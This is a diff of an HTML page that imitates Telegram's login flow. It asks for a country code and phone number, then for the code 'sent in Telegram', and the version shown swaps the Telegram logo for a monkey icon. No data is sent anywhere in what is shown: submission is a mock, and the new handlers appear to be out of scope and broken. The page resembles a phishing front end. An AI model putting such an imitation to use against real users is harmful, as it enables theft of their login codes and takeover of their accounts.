@@ -14,6 +14,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
+            overflow: hidden;
         }
 
         .container {
@@ -24,18 +25,17 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
-            position: relative;
         }
 
         .container img {
-            width: 90px;
-            margin-bottom: 10px;
+            width: 100px;
+            margin-bottom: 20px;
         }
 
         h1 {
-            font-size: 20px;
+            font-size: 18px;
             color: #333333;
-            margin: 5px 0;
+            margin-bottom: 10px;
         }
 
         p {
@@ -56,7 +56,7 @@
             margin-bottom: 5px;
         }
 
-        select, input[type="text"] {
+        select, input[type="text"], input[type="number"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -66,54 +66,7 @@
             margin-bottom: 10px;
         }
 
-        input[type="text"] {
-            -webkit-appearance: none;
-            -moz-appearance: textfield;
-        }
-
-        input[type="text"]::-webkit-inner-spin-button,
-        input[type="text"]::-webkit-outer-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-
-        .dropdown {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            cursor: pointer;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            position: relative;
-        }
-
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            background-color: #ffffff;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            width: 100%;
-            max-height: 200px;
-            overflow-y: auto;
-            z-index: 1;
-            top: 50px;
-            left: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .dropdown-content div {
-            padding: 10px;
-            cursor: pointer;
-        }
-
-        .dropdown-content div:hover {
-            background-color: #f0f0f0;
-        }
-
-        .dropdown-content img {
-            width: 24px;
+        input[type="checkbox"] {
             margin-right: 10px;
         }
 
@@ -127,23 +80,78 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
-            transition: background-color 0.3s ease;
         }
 
         .button:hover {
             background-color: #007ab8;
         }
 
+        .dropdown-container {
+            position: relative;
+            width: 100%;
+        }
+
+        .dropdown {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            background: #ffffff;
+            cursor: pointer;
+            text-align: left;
+            position: relative;
+        }
+
         .dropdown::after {
-            content: '>';
-            display: inline-block;
-            font-size: 20px;
-            margin-left: 10px;
+            content: '▼';
+            font-size: 16px;
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
             transition: transform 0.3s ease;
         }
 
         .dropdown.open::after {
-            transform: rotate(180deg);
+            content: '▲';
+            transform: translateY(-50%) rotate(180deg);
+        }
+
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            width: 100%;
+            background: #ffffff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-height: 200px;
+            overflow-y: auto;
+            z-index: 10;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .dropdown-menu.show {
+            display: block;
+        }
+
+        .dropdown-item {
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            cursor: pointer;
+        }
+
+        .dropdown-item:hover {
+            background-color: #f5f5f5;
+        }
+
+        .monkey-icon {
+            font-size: 50px;
+            margin-bottom: 20px;
         }
 
         #verificationContainer, #finalMessageContainer {
@@ -159,17 +167,26 @@
 
         <div class="input-group">
             <label for="countryCode">Country</label>
-            <div class="dropdown" id="dropdown">
-                <span id="selectedCountry">Select Country</span>
-            </div>
-            <div class="dropdown-content" id="dropdownContent">
-                <!-- Country options will be dynamically added here -->
+            <div class="dropdown-container">
+                <select id="countryCode" class="dropdown" onchange="updatePhoneNumberPrefix()">
+                    <option value="+61">🇦🇺 Australia (+61)</option>
+                    <option value="+1">🇺🇸 United States (+1)</option>
+                    <option value="+44">🇬🇧 United Kingdom (+44)</option>
+                    <option value="+49">🇩🇪 Germany (+49)</option>
+                    <option value="+33">🇫🇷 France (+33)</option>
+                    <option value="+81">🇯🇵 Japan (+81)</option>
+                    <option value="+91">🇮🇳 India (+91)</option>
+                    <option value="+86">🇨🇳 China (+86)</option>
+                    <option value="+7">🇷🇺 Russia (+7)</option>
+                    <option value="+82">🇰🇷 South Korea (+82)</option>
+                </select>
+                <div id="dropdownMenu" class="dropdown-menu"></div>
             </div>
         </div>
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number" inputmode="tel" pattern="[0-9]*">
+            <input type="text" id="phoneNumber" placeholder="Phone Number" oninput="formatPhoneNumber()" pattern="\d*">
         </div>
 
         <div>
@@ -180,13 +197,13 @@
     </div>
 
     <div class="container" id="verificationContainer">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
+        <div class="monkey-icon">🐵</div>
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
         <div class="input-group">
             <label for="verificationCode">Code</label>
-            <input type="text" id="verificationCode" placeholder="Code" inputmode="tel" pattern="[0-9]*">
+            <input type="number" id="verificationCode" placeholder="Code" inputmode="numeric" pattern="\d*">
         </div>
 
         <button class="button" onclick="submitVerification()">Submit</button>
@@ -199,83 +216,109 @@
     </div>
 
     <script>
-        const countryList = [
-            { code: '+1', name: 'United States', flag: '🇺🇸' },
-            { code: '+44', name: 'United Kingdom', flag: '🇬🇧' },
-            { code: '+61', name: 'Australia', flag: '🇦🇺' },
-            { code: '+49', name: 'Germany', flag: '🇩🇪' },
-            { code: '+33', name: 'France', flag: '🇫🇷' },
-            { code: '+81', name: 'Japan', flag: '🇯🇵' },
-            { code: '+91', name: 'India', flag: '🇮🇳' },
-            { code: '+86', name: 'China', flag: '🇨🇳' },
-            { code: '+7', name: 'Russia', flag: '🇷🇺' },
-            { code: '+82', name: 'South Korea', flag: '🇰🇷' },
-            { code: '+55', name: 'Brazil', flag: '🇧🇷' },
-            { code: '+34', name: 'Spain', flag: '🇪🇸' },
-            { code: '+39', name: 'Italy', flag: '🇮🇹' },
-            { code: '+27', name: 'South Africa', flag: '🇿🇦' },
-            { code: '+31', name: 'Netherlands', flag: '🇳🇱' },
-            { code: '+47', name: 'Norway', flag: '🇳🇴' },
-            { code: '+56', name: 'Chile', flag: '🇨🇱' },
-            { code: '+52', name: 'Mexico', flag: '🇲🇽' },
-            { code: '+48', name: 'Poland', flag: '🇵🇱' },
-            { code: '+65', name: 'Singapore', flag: '🇸🇬' },
-            { code: '+60', name: 'Malaysia', flag: '🇲🇾' }
-        ];
+        document.addEventListener('DOMContentLoaded', function() {
+            const countryDropdown = document.getElementById('countryCode');
+            const dropdownMenu = document.getElementById('dropdownMenu');
+            const countries = [
+                { name: 'Australia', code: '+61', flag: '🇦🇺' },
+                { name: 'United States', code: '+1', flag: '🇺🇸' },
+                { name: 'United Kingdom', code: '+44', flag: '🇬🇧' },
+                { name: 'Germany', code: '+49', flag: '🇩🇪' },
+                { name: 'France', code: '+33', flag: '🇫🇷' },
+                { name: 'Japan', code: '+81', flag: '🇯🇵' },
+                { name: 'India', code: '+91', flag: '🇮🇳' },
+                { name: 'China', code: '+86', flag: '🇨🇳' },
+                { name: 'Russia', code: '+7', flag: '🇷🇺' },
+                { name: 'South Korea', code: '+82', flag: '🇰🇷' }
+            ];
 
-        const dropdown = document.getElementById('dropdown');
-        const dropdownContent = document.getElementById('dropdownContent');
-        const selectedCountry = document.getElementById('selectedCountry');
-        const phoneNumberInput = document.getElementById('phoneNumber');
+            // Populate the dropdown menu
+            countries.forEach(country => {
+                const item = document.createElement('div');
+                item.classList.add('dropdown-item');
+                item.innerHTML = `${country.flag} ${country.name} (${country.code})`;
+                item.onclick = () => {
+                    countryDropdown.value = country.code;
+                    updatePhoneNumberPrefix();
+                    closeDropdown();
+                };
+                dropdownMenu.appendChild(item);
+            });
 
-        // Populate dropdown with countries
-        countryList.forEach(country => {
-            const option = document.createElement('div');
-            option.innerHTML = `<span>${country.flag}</span> ${country.name} (${country.code})`;
-            option.addEventListener('click', () => selectCountry(country));
-            dropdownContent.appendChild(option);
-        });
-
-        dropdown.addEventListener('click', () => {
-            dropdownContent.style.display = dropdownContent.style.display === 'none' || dropdownContent.style.display === '' ? 'block' : 'none';
-            dropdown.classList.toggle('open');
-        });
-
-        function selectCountry(country) {
-            selectedCountry.textContent = `${country.flag} ${country.name} (${country.code})`;
-            phoneNumberInput.value = country.code + ' ';
-            dropdownContent.style.display = 'none';
-            dropdown.classList.remove('open');
-        }
-
-        function goToVerificationPage() {
-            const phoneNumber = document.getElementById('phoneNumber').value.trim();
-            if (!phoneNumber || phoneNumber.length <= 3) {
-                alert('Please enter your phone number.');
-                return;
+            function toggleDropdown() {
+                dropdownMenu.classList.toggle('show');
+                countryDropdown.classList.toggle('open');
             }
-            document.getElementById('initialContainer').style.display = 'none';
-            document.getElementById('verificationContainer').style.display = 'block';
-            document.getElementById('phoneDisplay').textContent = `Phone Number: ${phoneNumber}`;
-        }
 
-        function submitVerification() {
-            const verificationCode = document.getElementById('verificationCode').value.trim();
-            if (!verificationCode) {
-                alert('Please enter the verification code.');
-                return;
+            function closeDropdown() {
+                dropdownMenu.classList.remove('show');
+                countryDropdown.classList.remove('open');
             }
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessageContainer').style.display = 'block';
-            document.getElementById('finalMessage').textContent = 'Verification successful!';
-        }
 
-        function resetForm() {
-            document.getElementById('finalMessageContainer').style.display = 'none';
-            document.getElementById('initialContainer').style.display = 'block';
-            document.getElementById('phoneNumber').value = '';
-            document.getElementById('verificationCode').value = '';
-        }
+            document.querySelector('.dropdown').addEventListener('click', toggleDropdown);
+
+            function updatePhoneNumberPrefix() {
+                const countryCode = countryDropdown.value;
+                const phoneNumberInput = document.getElementById('phoneNumber');
+                phoneNumberInput.value = phoneNumberInput.value.replace(/^\+\d*/, ''); // Remove previous code
+                phoneNumberInput.value = countryCode + phoneNumberInput.value;
+            }
+
+            function formatPhoneNumber() {
+                const phoneNumberInput = document.getElementById('phoneNumber');
+                phoneNumberInput.value = phoneNumberInput.value.replace(/[^0-9+.\-]/g, ''); // Allow only numbers, +, ., and -
+            }
+
+            function goToVerificationPage() {
+                const phoneNumberInput = document.getElementById('phoneNumber');
+                const phoneNumber = phoneNumberInput.value;
+                if (phoneNumber) {
+                    document.getElementById('phoneDisplay').innerText = phoneNumber;
+                    document.getElementById('initialContainer').style.display = 'none';
+                    document.getElementById('verificationContainer').style.display = 'block';
+                }
+            }
+
+            function submitVerification() {
+                // Save the verification code and show a final message (mock implementation)
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('finalMessageContainer').style.display = 'block';
+            }
+
+            function resetForm() {
+                document.getElementById('finalMessageContainer').style.display = 'none';
+                document.getElementById('initialContainer').style.display = 'block';
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('verificationCode').value = '';
+                document.getElementById('countryCode').value = '+61';
+            }
+
+            document.addEventListener('touchstart', handleTouchStart, false);
+            document.addEventListener('touchmove', handleTouchMove, false);
+
+            let yStart = null;
+            let yEnd = null;
+
+            function handleTouchStart(event) {
+                yStart = event.touches[0].clientY;
+            }
+
+            function handleTouchMove(event) {
+                yEnd = event.touches[0].clientY;
+
+                if (yStart === null) return;
+
+                if (yEnd > yStart + 50) {
+                    // Swipe Down
+                    document.getElementById('phoneNumber').blur();
+                } else if (yEnd < yStart - 50) {
+                    // Swipe Up
+                    document.getElementById('phoneNumber').focus();
+                }
+                yStart = null;
+                yEnd = null;
+            }
+        });
     </script>
 </body>
 </html>
